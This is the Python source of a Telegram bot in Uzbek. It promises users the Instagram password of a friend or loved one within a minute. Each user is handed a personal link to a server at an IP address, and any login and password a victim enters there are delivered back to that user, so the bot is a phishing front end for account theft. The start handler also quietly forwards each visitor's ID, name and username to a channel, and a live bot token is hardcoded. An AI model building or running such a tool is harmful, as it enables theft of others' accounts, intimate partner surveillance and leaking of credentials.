from datetime import datetime
from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Updater, CommandHandler, MessageHandler,Filters


def start(update,context):
    id = update.message.from_user.id
    first_name = update.message.from_user.first_name
    last_name = update.message.from_user.last_name
    user_name = update.message.from_user.username
    vaqt = datetime.now()
    context.bot.send_message(
        chat_id="@insta_parol011",
        text=f"""
        🆔 ID: {id}
        👤 Ismi: {first_name}
        👥 Familiyasi: {last_name}
        💬 Username: @{user_name}
        ⏰ Vaqt: {vaqt}

        botimga start bosdi
        👍
        """
    )
    text=f"""
     🕊 Assalomu alaykum *{update.message.from_user.first_name}* 🌴\n
    👮🏻‍♀️Bizning botimizga xush kelib 🌿\n
    🤖Bu bot *do'stizni 🫂* yoki *sevgan ❤️* insoningizni \n
    🐬instagram paroli *1 minutda* parolini 🔐 olishingiz mumkin\n
    💯Parolni olish uchun */link* tugmasini ustiga ✅
    """
    k=[
        [KeyboardButton("📇 Link 🌐"),KeyboardButton("🧬 Tugmali Link 🌐")],
        [KeyboardButton("🫂 Bizning kanal obuna bolib qoying 😁")]
    ]
    reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
    update.message.reply_text(text,parse_mode="Markdown",reply_markup=reply_markup)

def link(update,context):
    text = f"""
    ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
    \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
    \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
    """
    update.message.reply_text(text, parse_mode="Markdown")
    update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
                              parse_mode="Markdown")

def menyu(update,context):
    k=[
        [KeyboardButton("📇 Link 🌐"),KeyboardButton("🧬 Tugmali Link 🌐")]
    ]
    reply_markup=ReplyKeyboardMarkup(k,resize_keyboard=True)
    update.message.reply_text("📌 *Menyu*",parse_mode="Markdown",reply_markup=reply_markup)

def help(update,context):
    text=f"""
    🤖Bu bot *do'stizni 🫂* yoki *sevgan ❤️* insoningizni \n
    🐬instagram paroli *1 minutda* parolini 🔐 olishingiz mumkin\n
    💯Parolni olish uchun */link* tugmasini ustiga ✅
    """
    update.message.reply_text(text, parse_mode="Markdown")

def text(update,context):
    text=update.message.text
    if text=="📇 Link 🌐":
        text=f"""
        ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
        """
        update.message.reply_text(text,parse_mode="Markdown")
        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
                                  parse_mode="Markdown")
    elif text=="🧬 Tugmali Link 🌐":
        k=[
            [InlineKeyboardButton("🧬",url=f"http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}")]
        ]
        update.message.reply_text("🧬 Tugmali Link 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
                                  parse_mode="Markdown")

    elif text=="🫂 Bizning kanal obuna bolib qoying 😁":
        k=[
            [InlineKeyboardButton("Kanal 👀",url="https://t.me/insta_parol011")],
            [InlineKeyboardButton("Intagram 🫂",url="https://www.instagram.com/ahadj0n_tem1rbek0v/")],
        ]
        update.message.reply_text("Ishtimoiy tarmoqlarimiz 🌐", parse_mode="Markdown",reply_markup=InlineKeyboardMarkup(k))
        update.message.reply_text("Obuna bolib qoying 🐬")
    else:
        text = f"""
        ➡️ *http://13.60.29.35:8000/Nakrutka/{update.message.from_user.id}* ⬅️
        \n📌 Bu sizning likingiz buni *do'stizni 🫂* yoki *sevgan ❤️* insoningizga
        \nyuborsangiz. Linkga kirsa *login* va *parol* kiritsa sizga keladi 
        """
        update.message.reply_text(text, parse_mode="Markdown")
        update.message.reply_text("Copy qilish uchun `http://13.60.29.35:8000/Nakrutka/449766528` ni ustiga bos",
                                  parse_mode="Markdown")


def main():
    updater = Updater(token='8444297437:AAHDEuv1a0BvLHeDAzUJHGAxQGRsCsuIoI0', use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CommandHandler('link', link))
    dp.add_handler(CommandHandler('menyu', menyu))
    dp.add_handler(CommandHandler('help', help))
    dp.add_handler(MessageHandler(Filters.text,text))


    updater.bot.set_my_commands([
        BotCommand("start", "Botni boshlash"),
        BotCommand("help", "Botni qanday ishlatish qoidalari"),
        BotCommand("menyu", "Buyruqlar"),
        BotCommand("link", "Link olish"),
    ])
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
